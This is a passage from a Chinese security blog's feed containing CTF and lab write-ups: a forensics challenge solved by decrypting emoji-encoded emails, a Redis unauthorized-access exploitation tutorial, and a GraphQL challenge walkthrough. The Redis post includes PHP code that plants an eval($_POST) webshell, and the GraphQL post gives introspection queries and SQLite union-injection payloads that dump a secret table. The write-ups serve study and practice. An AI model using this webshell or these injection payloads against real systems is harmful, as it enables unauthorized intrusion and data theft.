提取码：(yzsa)</p><p>本题用得到的取证工具为<strong>MAGNET AXIOM</strong>，下载地址：<a href="https://pan.baidu.com/s/1pVuwFXvo2CoV5nC66kI_GQ" target="_blank" rel="noopener">软件下载</a>提取码：(5qqp)，推荐使用取证大师，能够检索的信息更多一些，可以在官方微信公众号联系客服获取试用版本</p></blockquote><p>题目下载下来解压发现是Windows系统中C盘文件夹，使用<strong>MAGNET AXIOM</strong>工具添加案例进行分析（PS：这软件贼吉尔大，使用时候占用资源贼鸡儿多</p><p>首先查看安装程序文件夹，可以发现存在<code>phpstudy</code>、<code>Firefox</code>、<code>MicrosoftEdge</code>、<code>maili</code>、<code>xshell</code>、<code>notepad++</code>等程序</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421204111450.png" alt></p><p>跟进phpstudy内分析发现安装有织梦cms文件，应该是本地搭建的网站</p><p>接着查看用户应用数据目录（相对路径为Thunder\Users\bob\AppData\Local），发现存在Firefox、MicrosoftEdge和Thunderbird软件的数据文件，那么首先分析用户的浏览记录，将过滤器设置为Firefox网络历史记录，得到结果如下：</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421184315903.png" alt></p><p>对访问记录进行分析，我们会发现该用户在11月28号的记录中可以看到访问了很多和emoji有关的网站，其中最可疑的网站是<a href="https://codemoji.org/，我们访问后发现这是一个使用emoji表情来加密文本的在线加密网站，同时根据网站提示发现网站生成密文的时候也会生成一个短连接用于分享密文信息和解密" target="_blank" rel="noopener">https://codemoji.org/，我们访问后发现这是一个使用emoji表情来加密文本的在线加密网站，同时根据网站提示发现网站生成密文的时候也会生成一个短连接用于分享密文信息和解密</a></p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421184451314.png" alt></p><p>观察分享的链接格式我们可以找到历史记录里面的一个短连接</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421184622325.png" alt></p><p>我们访问这个链接发现用到一个emoji表情作为密钥进行解密，翻找前后的浏览记录，我们可以发现这样两条记录</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421184900755.png" alt></p><p>我们尝试使用龙的emoji表情进行解密，成功解密得到明文</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421185354453.png" alt></p><p>接下来分析IE浏览器的使用记录</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421203223465.png" alt></p><p>发现用户访问了如下页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/a/Blog/2019/1130/4.html</span><br></pre></td></tr></table></figure><p>对应文件夹的路径如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thunder\phpstudy_pro\WWW\dede\a\Blog\2019\1130</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421203518078.png" alt></p><p>猜测得到的信息应该是AES或者DES加密过的</p><p>接下来查看Thunderbird软件的数据文件，将过滤器选择为EML(X)文件，翻阅邮件记录，根据时间顺序提取出来三个短连接，分别解密结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mzl.la&#x2F;37QeQ4v</span><br><span class="line">解得：haha, now we can chat!</span><br><span class="line">https:&#x2F;&#x2F;mzl.la&#x2F;2L5ZfnD</span><br><span class="line">解得：yeah, maybe... let me think ...</span><br><span class="line">https:&#x2F;&#x2F;mzl.la&#x2F;2svfAf5</span><br><span class="line">解得：aha, this way is safe!Remember my real name!</span><br></pre></td></tr></table></figure><p>另外我们在邮件中还发现存在内容单独的emoji的邮件，缺少对应可以解密的短连接，如下：</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421195719878.png" alt></p><p>这里我们还可以找到另一种关于emoji的加密方式，<code>emoji-aes</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;aghorler.github.io&#x2F;emoji-aes&#x2F;</span><br></pre></td></tr></table></figure><p>但是也需要密钥，这个密钥不支持emoji输入。</p><p>回过头来，根据对话的信息提示：<code>真实姓名</code>，而在<code>Thunder\Users\bob\Pictures\Camera Roll</code>发现sdcard文件夹，sdcard即手机的储存卡导出文件夹，再联系到需要寻找真名，想到手机通讯录，而通讯录的文件为<code>.vcf</code>格式，在文件夹中搜索<code>.vcf</code>文件，可以找到out.vcf文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thunder\Users\bob\Pictures\Camera Roll\sdcard\Android\data\com.android.backup\files\pending_blobs</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421194702799.png" alt></p><p>根据这篇文章查看vcf文件内容：<a href="https://jingyan.baidu.com/article/3aed632e30b0f1701080918a.html，，可以发现只有`matachuan`这一个用户拥有邮箱信息，而且**real" target="_blank" rel="noopener">https://jingyan.baidu.com/article/3aed632e30b0f1701080918a.html，，可以发现只有`matachuan`这一个用户拥有邮箱信息，而且**real</a> name**那封邮件正是从<a href="mailto:rjddd321@protonmail.com">rjddd321@protonmail.com</a>发来的，也就是说matachuan就是他的真名</p><p>尝试以matachuan为key解密邮件中的emoji-aes，可以得到以下几条信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这个还能加密中文呢，无敌了</span><br><span class="line">那你把后台账户发我吧</span><br><span class="line">admin admin</span><br><span class="line">帮你传了点东西，以后你写博客应该用的到</span><br><span class="line">好的，我一会上去看一看，对了，组织的暗号已经换了，“GxD1r”</span><br></pre></td></tr></table></figure><p>根据提示的信息可以得到该用户登录了dedecms后台，并且上传了秘密文件，另外一个是可能是某种加密的密钥为<code>GxD1r</code>，回过结合dedecms里面可疑的加密信息，尝试使用AES解密成功</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421203837476.png" alt></p><p>参考资料：</p><blockquote><p><a href="http://www.ga1axy.top/index.php/archives/25/" target="_blank" rel="noopener">http://www.ga1axy.top/index.php/archives/25/</a></p><p><a href="https://blog.xiafeng2333.top/ctf-30/#" target="_blank" rel="noopener">https://blog.xiafeng2333.top/ctf-30/#</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近状态太低迷，哎，难受的鸭皮&lt;/p&gt;
&lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="虎符网络安全大赛" scheme="http://yoursite.com/tags/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>Redis未授权访问漏洞复现与利用</title>
    <link href="http://yoursite.com/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
    <published>2020-04-18T03:50:17.000Z</published>
    <updated>2020-04-18T04:07:25.034Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-漏洞简介以及危害"><a href="#0x-01-漏洞简介以及危害" class="headerlink" title="0x 01 漏洞简介以及危害"></a>0x 01 漏洞简介以及危害</h3><ul><li>漏洞简介</li></ul><p>​        Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis  服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取  Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>简单说，漏洞的产生条件有以下两点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</span><br><span class="line">（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。</span><br></pre></td></tr></table></figure><ul><li>漏洞危害</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</span><br><span class="line">（2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</span><br><span class="line">（3）最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</span><br></pre></td></tr></table></figure><h3 id="0x-02-漏洞复现"><a href="#0x-02-漏洞复现" class="headerlink" title="0x 02 漏洞复现"></a>0x 02 漏洞复现</h3><p>参考这篇文章搭建复现环境：<a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">10.Redis未授权访问漏洞复现与利用</a></p><p>攻击机ip地址：192.168.194.132（本机虚拟机）</p><p>靶机IP地址：47.96.150.181（公网服务器）</p><h3 id="0x-03-未授权访问漏洞测试"><a href="#0x-03-未授权访问漏洞测试" class="headerlink" title="0x 03 未授权访问漏洞测试"></a>0x 03 未授权访问漏洞测试</h3><ul><li>验证漏洞存在</li></ul><p><img src="/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/image-20200418115921434.png" alt></p><h4 id="3-1-利用redis写webshell"><a href="#3-1-利用redis写webshell" class="headerlink" title="3.1 利用redis写webshell"></a>3.1 利用redis写webshell</h4><p>利用前提：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</span><br><span class="line">2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。）</span><br></pre></td></tr></table></figure><p>我们尝试把shell写入/var/www/html目录下：</p><p><img src="/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/image-20200418120207512.png" alt></p><p>靶机查看是否写入成功</p><p><img src="/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/image-20200418120256926.png" alt></p><p>成功写入shell。</p><p>当数据库过大时，redis写shell的小技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">set_time_limit(0);</span><br><span class="line">$fp&#x3D;fopen(&#39;bmjoker.php&#39;,&#39;w&#39;);</span><br><span class="line">fwrite($fp,&#39;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#39;);</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="3-2-利用”公私钥”认证获取root权限"><a href="#3-2-利用”公私钥”认证获取root权限" class="headerlink" title="3.2 利用”公私钥”认证获取root权限"></a>3.2 利用”公私钥”认证获取root权限</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-漏洞简介以及危害&quot;&gt;&lt;a href=&quot;#0x-01-漏洞简介以及危害&quot; class=&quot;headerlink&quot; title=&quot;0x 01 漏洞简介以及危害&quot;&gt;&lt;/a&gt;0x 01 漏洞简介以及危害&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;漏洞简介&lt;/li&gt;
&lt;/ul&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>当CTF遇上GraphQL的那些事</title>
    <link href="http://yoursite.com/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>http://yoursite.com/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</id>
    <published>2020-04-14T06:17:45.000Z</published>
    <updated>2020-04-15T17:03:16.694Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-前言"><a href="#0x-01-前言" class="headerlink" title="0x 01 前言"></a>0x 01 前言</h3><p>​    在之前的VolgaCTF 2020考到了GraphQL知识点，GraphQL在CTF比赛中虽然遇到的不多，但偶尔也会碰到，在碰到GraphQL的题目时候该如何解决呢？于是就有了这一篇文章。</p><h3 id="0x-02-认识GraphQL"><a href="#0x-02-认识GraphQL" class="headerlink" title="0x 02 认识GraphQL"></a>0x 02 认识GraphQL</h3><p>​        那么什么是GraphQL呢？GraphQL是由Facebook创造并开源的一种用于API的查询语言。看到QL这样的字眼，很容易产生误解，以为是新的数据库查询语言，但其实GraphQL和数据库没有什么太大关系，GraphQL并不直接操作查询数据库，可以理解为传统的后端代码与数据库之间又多加了一层，这一层就是GraphQL。</p><p>想快速入门GraphQL的相关用法可以参考这一篇文章<a href="https://segmentfault.com/a/1190000014131950" target="_blank" rel="noopener">30分钟理解GraphQL核心概念</a></p><p>我们这里重点关注一下Resolver（解析函数）的工作流程，假设我们定义了以下的查询语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Query &#123;</span><br><span class="line">  articles &#123;</span><br><span class="line">       id</span><br><span class="line">       author &#123;</span><br><span class="line">           name</span><br><span class="line">       &#125;</span><br><span class="line">       comments &#123;</span><br><span class="line">      id</span><br><span class="line">      desc</span><br><span class="line">      author</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GraphQL在解析这段查询语句时会按如下步骤进行解析：</p><ul><li>首先进行第一层解析，当前<code>Query</code>的<code>Root Query</code>类型是<code>query</code>，同时需要它的名字是<code>articles</code></li><li>之后会尝试使用<code>articles</code>的<code>Resolver</code>获取解析数据，第一层解析完毕</li><li>之后对第一层解析的返回值，进行第二层解析，当前<code>articles</code>还包含三个子<code>Query</code>，分别是<code>id</code>、<code>author</code>和<code>comments</code><ul><li>id在Author类型中为标量类型，解析结束</li><li>author在Author类型中为对象类型User，尝试使用<code>User</code>的<code>Resolver</code>获取数据，当前field解析完毕</li><li>之后对第二层解析的返回值，进行第三层解析，当前<code>author</code>还包含一个<code>Query</code>, <code>name</code>，由于它是标量类型，解析结束</li><li>comments同上…</li></ul></li></ul><p>​        总结来说，GraphQL大体的解析流程就是遇到一个Query之后，尝试使用它的Resolver取值，之后再对返回值进行解析，这个过程是递归的，直到所解析Field的类型是<code>Scalar Type（标量类型）</code>为止。解析的整个过程我们可以把它想象成一个很长的Resolver Chain（解析链）。GraphQL大体的解析流程很像是遍历树结构，那么他的返回值也是类<em>树</em>结构展示的。</p><p>​        对于发送数据我们可以使用postman或者GraphiQL，相对于burp suit，数据结构会更加直观一些。</p><h3 id="0x-03-常用payload"><a href="#0x-03-常用payload" class="headerlink" title="0x 03 常用payload"></a>0x 03 常用payload</h3><p>​    在对GraphQL测试之前我们要知道只有代码里写了接口，定义了相应的schema，才能通过GraphQL查询出对应结果，所以并不是通过GraphQL就能查询获取数据库中的所有数据。</p><p>​    由于GraphQL自带强大的内省自检机制，可以直接获取后端定义的所有接口信息，常常存在信息泄露问题。那么我们可以通过<code>__schema</code>查询所有可用对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    __schema &#123;</span><br><span class="line">        types &#123;</span><br><span class="line">            name</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>__type</code>查询指定对象的所有字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    __type(name: &quot;User&quot;) &#123;</span><br><span class="line">        name</span><br><span class="line">        fields &#123;</span><br><span class="line">            name</span><br><span class="line">            type &#123;</span><br><span class="line">                name</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是有时目标网站可能存在几十个对象，一个一个查找出具体的字段显示是太麻烦了，那么通过这两个payload可以获取所有对象和字段</p><p>payload1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...FullType&#125;directives&#123;name description locations args&#123;...InputValue&#125;&#125;&#125;&#125;fragment FullType on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...InputValue&#125;type&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;name description type&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...FullType&#125;directives&#123;name description args&#123;...InputValue&#125;onOperation onFragment onField&#125;&#125;&#125;fragment FullType on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...InputValue&#125;type&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;name description type&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>具体原理是通过<strong>IntrospectionQuery</strong>，返回包含足够多的信息的结果。</p><p>另外这篇文章里面*[GraphQL injection](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL</a> Injection)*也提供了一些payload可供使用</p><ul><li>常用工具：</li></ul><p><a href="https://github.com/swisskyrepo/GraphQLmap" target="_blank" rel="noopener">https://github.com/swisskyrepo/GraphQLmap</a></p><h3 id="0x-04-例题分析："><a href="#0x-04-例题分析：" class="headerlink" title="0x 04 例题分析："></a>0x 04 例题分析：</h3><p>这里以HITCTF2018 BabyQuery为例，题目的复现环境可以在github上找到：<a href="https://github.com/JohnHubcr/HITCTF2018/tree/master/web/BabyQuery" target="_blank" rel="noopener">HITCTF2018 BabyQuery</a></p><p>题目打开有一个点击查询成绩的按钮，点击会弹窗显示成绩，右键源代码可以发现一段js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line">            var query_data &#x3D; &#123;&#39;query&#39;: &#39;&#123; getscorebyid(id: &quot;GE&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;)&#123; id name score &#125; &#125;&#39;&#125;</span><br><span class="line">            var btn &#x3D; $(&#39;#query&#39;);</span><br><span class="line">            btn.click(function()&#123;</span><br><span class="line">                $.post(&#39;&#x2F;graphql&#39;, query_data, function(result)&#123;</span><br><span class="line">                    alert(result);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>根据graphql可知后端使用了graphql查询api，我们使用上文中的payload，查看schema发现Query 操作有两个field: getscorebyyourname和getscorebyid 参数分别是name和id, 通过手工测试发现id参数经过base32编码且仅能是1位数, 而name参数存在SQL注入，那么可以构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">query&#x3D;</span><br><span class="line">&#123;  getscorebyyourname(name:&quot;xxxx&quot;)</span><br><span class="line">&#123;</span><br><span class="line">score</span><br><span class="line">name</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>name参数的值用我们构造SQL注入语句的经过base32编码后的结果替换。</p><p>首先是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select sqlite_version()-- </span><br><span class="line">&#x2F;&#x2F;查询出版本号:3.11.0,那么可以判断数据库为sqlite3</span><br><span class="line">1&#39; union select (select group_concat(name,0x3a) from sqlite_master)-- </span><br><span class="line">&#x2F;&#x2F;得到users和Secr3t_fl4g</span><br><span class="line">1&#39; union select (select flag from Secr3t_fl4g)-- </span><br><span class="line">&#x2F;&#x2F;得到flag：HITCTF&#123;fee26d3a146a404e106b1ed93156f30e&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20200416004911642.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://cloud.tencent.com/developer/article/1528799" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1528799</a></p><p><a href="https://segmentfault.com/a/1190000014131950" target="_blank" rel="noopener">https://segmentfault.com/a/1190000014131950</a></p><p><a href="https://blog.csdn.net/qq_41882147/article/details/82966783" target="_blank" rel="noopener">https://blog.csdn.net/qq_41882147/article/details/82966783</a></p><p><a href="https://www.anquanke.com/post/id/156930" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156930</a></p><p><a href="https://www.anquanke.com/post/id/147455" target="_blank" rel="noopener">https://www.anquanke.com/post/id/147455</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-前言&quot;&gt;&lt;a href=&quot;#0x-01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x 01 前言&quot;&gt;&lt;/a&gt;0x 01 前言&lt;/h3&gt;&lt;p&gt;​    在之前的VolgaCTF 2020考到了GraphQL知识点，GraphQL在CT
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>出题笔记（一）</title>
    <link href="http://yoursite.com/2020/04/11/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/11/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-04-11T07:46:00.000Z</published>
    <updated>2020-04-12T08:53:43.243Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0f5575875875b2be4fc9ff7ef7fba887d8681309c2a915bec81e81cdff6b09fd"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="出题笔记" scheme="http://yoursite.com/categories/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="出题" scheme="http://yoursite.com/tags/%E5%87%BA%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>命令执行tricks</title>
    <link href="http://yoursite.com/2020/04/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ctricks/"/>
    <id>http://yoursite.com/2020/04/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ctricks/</id>
    <published>2020-04-07T08:42:11.000Z</published>
    <updated>2020-04-07T13:15:27.126Z</updated>
    
